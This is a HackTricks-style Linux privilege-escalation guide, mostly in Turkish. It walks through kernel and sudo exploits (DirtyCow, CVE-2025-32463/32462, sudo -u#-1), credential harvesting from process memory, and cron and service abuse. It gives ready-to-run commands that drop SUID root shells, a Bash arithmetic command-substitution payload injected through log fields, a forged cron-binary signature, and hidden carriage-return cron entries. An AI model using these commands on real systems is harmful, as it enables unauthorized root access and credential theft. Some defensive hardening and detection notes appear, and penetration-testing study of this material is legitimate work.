# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

İşletim sistemi hakkında biraz bilgi edinerek başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Yol

`PATH` değişkeni içindeki herhangi bir klasörde **yazma izinleriniz varsa**, bazı library'leri veya binary'leri hijack edebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgisi

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığına bakın
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Bundan iyi bir vulnerable kernel listesi ve bazı zaten **compiled exploits** burada bulunabilir: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O web sitesinden tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploitlerini aramaya yardımcı olabilecek araçlar şunlardır:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (kurban üzerinde çalıştırın, yalnızca kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google’da arayın**, belki kernel sürümünüz bazı kernel exploitlerinde yazıyordur ve böylece bu exploit’in geçerli olduğundan emin olursunuz.

Ek kernel exploitation teknikleri:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

İçinde görünen güvenlik açığı olan sudo sürümlerine göre:
```bash
searchsploit sudo
```
sudo sürümünün vulnerable olup olmadığını bu `grep` ile kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 öncesi Sudo sürümleri (**1.9.14 - 1.9.17 < 1.9.17p1**), `/etc/nsswitch.conf` dosyası kullanıcı kontrollü bir dizinden kullanıldığında, yetkisiz yerel kullanıcıların `sudo --chroot` seçeneği üzerinden ayrıcalıklarını root seviyesine yükseltmesine izin verir.

Bu [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), bu [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) sömürmek için kullanılabilir. Exploit'i çalıştırmadan önce, `sudo` sürümünüzün vulnerable olduğundan ve `chroot` özelliğini desteklediğinden emin olun.

Daha fazla bilgi için, orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) sayfasına bakın.

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 öncesi Sudo (etkilenen aralık bildirilen: **1.8.8–1.9.17**), `sudo -h <host>` içindeki **kullanıcı tarafından sağlanan hostname** değerini, **gerçek hostname** yerine kullanarak host-based sudoers kurallarını değerlendirebilir. Eğer sudoers başka bir host üzerinde daha geniş ayrıcalıklar veriyorsa, bu host'u yerelde **spoof** edebilirsiniz.

Gereksinimler:
- Vulnerable sudo sürümü
- Host'a özel sudoers kuralları (host, mevcut hostname de değildir `ALL` da değildir)

Örnek sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
İzin verilen host’u spoof ederek exploit et:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Sahte adın çözümlemesi bloklanıyorsa, onu `/etc/hosts` dosyasına ekleyin veya DNS sorgularından kaçınmak için zaten loglarda/configs içinde görünen bir hostname kullanın.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız oldu

Bu açıkın nasıl istismar edilebileceğine dair bir **örnek** için **HTB’nin smasher2 kutusunu** kontrol edin
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem enumerasyonu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları enumerate et

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Eğer bir container içindeyseniz, aşağıdaki container-security bölümünden başlayın ve ardından runtime-specific abuse sayfalarına geçin:


{{#ref}}
container-security/
{{#endref}}

## Drives

**Neyin mount edildiğini ve edilmediğini**, nerede ve neden olduğunu kontrol edin. Eğer bir şey unmounted ise, onu mount etmeyi deneyip private info olup olmadığını kontrol edebilirsiniz
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Faydalı software

Faydalı binaries'leri enumerate et
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir compiler kurulu mu** diye kontrol edin. Bu, bir kernel exploit kullanmanız gerekirse faydalıdır çünkü onu kullanacağınız makinede (veya benzer bir makinede) derlemeniz tavsiye edilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Vulnerable Software Installed

Yüklü **paketlerin ve servislerin sürümünü** kontrol edin. Belki de ayrıcalıkları yükseltmek için sömürülebilecek eski bir Nagios sürümü (örneğin) vardır…\
En şüpheli yüklü yazılımların sürümünü manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Eğer makineye SSH erişiminiz varsa, makine içinde kurulu eski ve vulnerable yazılımları kontrol etmek için **openVAS** da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çok fazla bilgi göstereceğini ve bunun büyük ölçüde işe yaramaz olacağını unutmayın; bu nedenle, kurulu herhangi bir yazılım sürümünün bilinen exploits karşısında vulnerable olup olmadığını kontrol eden OpenVAS veya benzeri uygulamalar kullanmanız önerilir_

## Processes

Hangi **processes**’lerin çalıştırıldığını inceleyin ve herhangi bir process’in **olması gerekenden daha fazla yetkiye** sahip olup olmadığını kontrol edin (belki de root tarafından çalıştırılan bir tomcat?)
```bash
ps aux
ps -ef
top -n 1
```
Her zaman mümkün olan [**electron/cef/chromium debugger**]lerin çalışıp çalışmadığını kontrol et, bunu ayrıcalıkları yükseltmek için kötüye kullanabilirsin](electron-cef-chromium-debugger-abuse.md). **Linpeas**, prosesin komut satırında `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca proses binary’leri üzerindeki ayrıcalıklarını da **kontrol et**, belki birinin üzerine yazabilirsin.

### Cross-user parent-child chains

Bir çocuğu prosesi, ebeveyninden **farklı bir kullanıcı** altında çalışıyorsa bu otomatik olarak kötü amaçlı değildir, ancak yararlı bir **triage sinyali**dir. Bazı geçişler beklenir (`root`'un bir service user başlatması, login manager'ların session süreçleri oluşturması), ancak alışılmadık zincirler wrapper’ları, debug yardımcılarını, persistence’i veya zayıf runtime trust boundary’lerini ortaya çıkarabilir.

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Beklenmedik bir chain bulursanız, parent command line’ı ve davranışını etkileyen tüm dosyaları inceleyin (`config`, `EnvironmentFile`, helper scripts, çalışma dizini, writable arguments). Birkaç gerçek privesc yolunda child’ın kendisi writable değildi, ancak **parent-controlled config** veya helper chain writable idi.

### Deleted executables and deleted-open files

Runtime artifacts çoğu zaman silindikten **sonra** da erişilebilir kalır. Bu, hem privilege escalation hem de zaten sensitive dosyaları açık olan bir process’ten evidence kurtarmak için kullanışlıdır.

Deleted executables için kontrol edin:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Eğer `/proc/<PID>/exe` `(deleted)` gösteriyorsa, süreç hâlâ eski binary image’ı bellekten çalıştırıyor demektir. Bu, araştırmak için güçlü bir işarettir çünkü:

- silinen executable ilginç strings veya credentials içerebilir
- çalışan süreç hâlâ faydalı file descriptors açığa çıkarabilir
- silinmiş ayrıcalıklı bir binary, yakın zamanda yapılmış bir müdahaleyi veya cleanup girişimini gösterebilir

Silinmiş-açık dosyaları global olarak topla:
```bash
lsof +L1
```
İlginç bir descriptor bulursanız, onu doğrudan recover edin:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Bu, özellikle bir process hâlâ silinmiş bir secret, script, database export veya flag file açık tuttuğunda çok değerlidir.

### Process monitoring

Process'leri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçlar kullanabilirsiniz. Bu, sık çalıştırılan vulnerable process'leri veya bir dizi gereksinim karşılandığında çalışan process'leri belirlemek için çok faydalı olabilir.

### Process memory

Bir sunucudaki bazı servisler **credentials'leri memory içinde açık metin olarak** kaydeder.\
Normalde, diğer kullanıcılara ait process'lerin memory'sini okumak için **root privileges** gerekir; bu nedenle bu yöntem genellikle zaten root olduğunuzda ve daha fazla credentials keşfetmek istediğinizde daha kullanışlıdır.\
Ancak, **regular user olarak sahip olduğunuz process'lerin memory'sini okuyabileceğinizi** unutmayın.

> [!WARNING]
> Günümüzde çoğu makine **varsayılan olarak ptrace'a izin vermez**; bu da yetkisiz kullanıcınıza ait diğer process'leri dump edemeyeceğiniz anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace erişilebilirliğini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: aynı uid'ye sahip oldukları sürece tüm process'ler debug edilebilir. Bu, ptracing'in çalışma şeklinin klasik yöntemidir.
> - **kernel.yama.ptrace_scope = 1**: yalnızca parent process debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: yalnızca admin ptrace kullanabilir, çünkü CAP_SYS_PTRACE capability gerektirir.
> - **kernel.yama.ptrace_scope = 3**: hiçbir process ptrace ile trace edilemez. Bir kez ayarlandıktan sonra ptracing'i yeniden etkinleştirmek için reboot gerekir.

#### GDB

Örneğin bir FTP service'inin memory'sine erişiminiz varsa, Heap'i alıp içindeki credentials'leri arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir process ID için, **maps o process'in** sanal adres alanı içinde belleğin nasıl map edildiğini gösterir; ayrıca her mapped bölgenin **izinlerini** de gösterir. **mem** pseudo file ise **process'in belleğinin kendisini** açığa çıkarır. **maps** file'ından hangi **memory regions'ın okunabilir** olduğunu ve offset'lerini biliriz. Bu bilgiyi kullanarak **mem file'ına seek eder ve tüm okunabilir region'ları** bir dosyaya dump ederiz.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Kernel’in sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubunca okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux için ProcDump

ProcDump, Windows için Sysinternals araçlar paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış bir sürümüdür. Şuradan alın: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Bir process memory dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Root gereksinimlerini manuel olarak kaldırabilir ve sizin sahip olduğunuz process'i dökebilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)

### Credentials from Process Memory

#### Manual example

Eğer authenticator process'inin çalıştığını fark ederseniz:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
İşlemi dump edebilirsin (bir işlemin belleğini dump etmenin farklı yollarını bulmak için önceki bölümlere bak) ve belleğin içinde credentials arayabilirsin:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **memory’den clear text credentials çalar** ve bazı **well known files** içinden de alır. Düzgün çalışması için root yetkileri gerekir.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) root olarak çalışıyor – web tabanlı scheduler privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyorsa ve yalnızca loopback’e bağlıysa, yine de SSH local port-forwarding ile ona ulaşabilir ve privilege escalation için yetkili bir job oluşturabilirsin.

Tipik zincir
- Loopback-only portu keşfet (örn. 127.0.0.1:8000) ve `ss -ntlp` / `curl -v localhost:8000` ile Basic-Auth realm’ini bul
- Credentials’ı operasyonel artefact’larda bul:
- `zip -P <password>` kullanan backups/scripts
- `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` ifşa eden systemd unit
- Tunnel kur ve login yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Hemen çalıştırılacak yüksek yetkili bir job oluştur ve çalıştır (SUID shell düşürür):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullan:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI’yi root olarak çalıştırmayın; bunu ayrı bir kullanıcı ve en düşük izinlerle sınırlandırın
- localhost’a bağlayın ve ayrıca erişimi firewall/VPN ile kısıtlayın; parolaları yeniden kullanmayın
- unit files içine secrets gömmekten kaçının; secret stores veya yalnızca root’un erişebildiği EnvironmentFile kullanın
- On-demand job executions için audit/logging etkinleştirin



Herhangi bir scheduled job’un vulnerable olup olmadığını kontrol edin. Belki root tarafından executed edilen bir scriptten faydalanabilirsiniz (wildcard vuln? root’un kullandığı files’ları modify edebilir misiniz? symlink kullanabilir misiniz? root’un kullandığı directory içinde belirli files oluşturabilir misiniz?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Eğer `run-parts` kullanılıyorsa, hangi isimlerin gerçekten çalışacağını kontrol edin:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Bu, yanlış pozitifleri önler. Yazılabilir bir periyodik dizin yalnızca payload dosya adınız yerel `run-parts` kurallarıyla eşleşiyorsa işe yarar.

### Cron path

Örneğin, _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"in /home/user üzerinde yazma yetkilerine sahip olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcısı path ayarlamadan bir komut ya da script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
O zaman, şunu kullanarak bir root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### `*` içeren bir script ile Cron (Wildcard Injection)

Root tarafından çalıştırılan bir script bir komut içinde “**\***” içeriyorsa, bunu beklenmeyen şeyler yapmak için istismar edebilirsin (ör. privesc). Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard önünde** _**/some/path/\***_ **gibi bir path varsa, bu vulnerable değildir** (hatta _**./\***_ **bile değildir).**

Daha fazla wildcard exploitation trick için şu sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, `((...))`, `$((...))` ve `let` içinde arithmetic evaluation’dan önce parameter expansion ve command substitution yapar. Eğer bir root cron/parser untrusted log field’larını okuyup bunları arithmetic context’e verirse, attacker root olarak cron çalıştığında execute olacak bir command substitution `$(...)` inject edebilir.

- Neden çalışır: Bash’te expansion’lar şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, ardından word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalışır), sonra kalan numeric `0` arithmetic için kullanılır; böylece script hata vermeden devam eder.

- Tipik vulnerable pattern:
```bash
#!/bin/bash
# Örnek: bir log'u parse et ve log'dan gelen bir count field'ını "topla"
while IFS=',' read -r ts user count rest; do
# log attacker-controlled ise count untrusted'dır
(( total += count ))     # veya: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parse edilen log içine attacker-controlled text yazdırın; böylece numeric-looking field içinde bir command substitution olsun ve bir digit ile bitsin. Komutunuzun stdout’a yazmadığından emin olun (veya redirect edin), böylece arithmetic geçerli kalır.
```bash
# Log içindeki injected field değeri (ör. app'nin aynen logladığı crafted bir HTTP request ile):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# Root cron parser (( total += count )) değerlendirdiğinde, komutunuz root olarak çalışır.
```

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan bir cron scriptini **modify edebiliyorsanız**, çok kolay bir şekilde shell alabilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Root tarafından çalıştırılan script, **tam erişiminizin olduğu bir dizin** kullanıyorsa, bu klasörü silip yerine **başka bir klasöre symlink olan bir klasör** oluşturmak faydalı olabilir; böylece sizin kontrol ettiğiniz bir script sunulur.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink doğrulaması ve daha güvenli dosya işleme

Yol ile dosya okuyan veya yazan ayrıcalıklı script/binary'leri incelerken, linklerin nasıl ele alındığını doğrulayın:

- `stat()` bir symlink'i takip eder ve hedefin metadata'sını döndürür.
- `lstat()` linkin kendisinin metadata'sını döndürür.
- `readlink -f` ve `namei -l` son hedefi çözümlemeye ve yolun her bir bileşeninin izinlerini göstermeye yardımcı olur.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Defenders/developers için, symlink hilelerine karşı daha güvenli kalıplar şunlardır:

- `O_EXCL` ile `O_CREAT`: yol zaten varsa başarısız olur (saldırganın önceden oluşturduğu link/dosyaları engeller).
- `openat()`: güvenilir bir directory file descriptor’a göre işlem yapar.
- `mkstemp()`: geçici dosyaları güvenli izinlerle atomik olarak oluşturur.

### Özel imzalı cron binary’leri ve yazılabilir payload’lar
Blue team’ler bazen root olarak çalıştırmadan önce özel bir ELF section dump edip vendor string için grep yaparak cron-driven binary’leri “sign” eder. Eğer bu binary group-writable ise (ör. `/opt/AV/periodic-checks/monitor` sahibi `root:devs 770`) ve signing material’ı leak edebilirsen, section’ı forge edip cron görevini hijack edebilirsin:

1. Doğrulama akışını yakalamak için `pspy` kullan. Era’da root, önce `objcopy --dump-section .text_sig=text_sig_section.bin monitor` çalıştırdı, ardından `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` yaptı ve sonra dosyayı execute etti.
2. Leaked key/config’i (`signing.zip` içinden) kullanarak beklenen certificate’ı yeniden oluştur:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Zararlı bir replacement oluştur (ör. SUID bash bırak, SSH key’ini ekle) ve certificate’ı `.text_sig` içine göm ki grep geçsin:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Schedule edilen binary’yi execute bit’lerini koruyarak overwrite et:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekle; naive signature check başarılı olduğunda payload’ün root olarak çalışır.

### Sık çalışan cron job’lar

Her 1, 2 veya 5 dakikada bir çalıştırılan process’leri aramak için process’leri monitor edebilirsin. Bundan faydalanıp privilege escalation yapabilirsin.

Örneğin, **1 dakika boyunca her 0.1s’de monitor etmek**, **en az çalıştırılan command’lara göre sıralamak** ve en çok çalıştırılan command’ları silmek için şunu yapabilirsin:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca şunu da kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her process’i izler ve listeler).

### Saldırganın ayarladığı mode bit’lerini koruyan root backups (pg_basebackup)

Eğer root-owned bir cron, yazabildiğiniz bir database directory’ye karşı `pg_basebackup` (veya herhangi bir recursive copy) çalıştırıyorsa, bir **SUID/SGID binary** yerleştirebilirsiniz; bu binary, backup output içine aynı mode bit’leriyle **root:root** olarak yeniden kopyalanır.

Tipik discovery akışı (düşük yetkili bir DB user olarak):
- `pspy` kullanarak, root cron’un `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` gibi bir komut çalıştırdığını her dakika tespit edin.
- Source cluster’ın (ör. `/var/lib/postgresql/14/main`) sizin tarafınızdan yazılabilir olduğunu ve destination’ın (`/opt/backups/current`) job’dan sonra root tarafından sahiplenildiğini doğrulayın.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Bu, `pg_basebackup` kümenin kopyalanması sırasında dosya mod bitlerini koruduğu için çalışır; root tarafından çağrıldığında hedef dosyalar **root ownership + saldırgan tarafından seçilen SUID/SGID** miras alır. Permissions’ı koruyan ve executable bir konuma yazan benzer herhangi bir privileged backup/copy routine savunmasızdır.

### Invisible cron jobs

Bir cronjob oluşturmak mümkündür; **bir comment’ten sonra carriage return ekleyerek** (newline character olmadan), ve cron job çalışır. Örnek (carriage return char’a dikkat edin):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Bu tür gizli girişleri tespit etmek için, kontrol karakterlerini gösteren araçlarla cron dosyalarını inceleyin:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ dosyaları

Herhangi bir `.service` dosyasını yazıp yazamadığınızı kontrol edin; eğer yazabiliyorsanız, onu **değiştirerek** servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor'unuzu çalıştırmasını** sağlayabilirsiniz (belki makinenin yeniden başlatılmasını beklemeniz gerekir).\
Örneğin, backdoor'unuzu .service dosyasının içine **`ExecStart=/tmp/script.sh`** ile oluşturun

### Writable service binaries

**Servisler tarafından çalıştırılan binary'ler üzerinde yazma izniniz varsa**, bunları backdoor'larla değiştirebilirsiniz; böylece servisler yeniden çalıştırıldığında backdoor'lar da çalıştırılır.

### systemd PATH - Relative Paths

**systemd** tarafından kullanılan PATH'i şu şekilde görebilirsiniz:
```bash
systemctl show-environment
```
Yolun herhangi bir klasörüne **yazabildiğinizi** fark ederseniz, **privilege escalation** yapabilmeniz mümkün olabilir. Şu tür **service configurations** dosyalarında kullanılan **relative paths** için arama yapmanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, sistemd PATH klasöründe yazabildiğiniz, relative path binary ile aynı ada sahip bir **executable** oluşturun ve servis savunmasız eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, **backdoor**'unuz çalıştırılacaktır (ayrıcalıksız kullanıcılar genellikle servisleri başlatıp/durduramazlar ama `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**`man systemd.service` ile services hakkında daha fazla bilgi edinin.**

## **Timers**

